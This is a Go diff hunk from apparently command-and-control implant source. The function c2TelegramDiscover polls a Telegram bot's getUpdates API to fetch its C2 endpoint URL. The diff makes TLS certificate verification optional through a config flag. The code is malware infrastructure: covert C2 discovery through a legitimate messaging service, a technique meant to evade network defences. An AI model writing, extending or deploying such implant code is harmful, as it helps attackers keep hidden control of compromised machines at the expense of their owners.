@@ -240,7 +240,7 @@ func c2TelegramDiscover() {
 		Transport: &http.Transport{
 			// Tolerate aggressive middleboxes on foreign networks; the payload
 			// is just an endpoint URL, and the agent already trusts its C2 TLS.
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
 		},
 	}
 	resp, err := client.Get(base + "/bot" + token + "/getUpdates?limit=100&timeout=0")
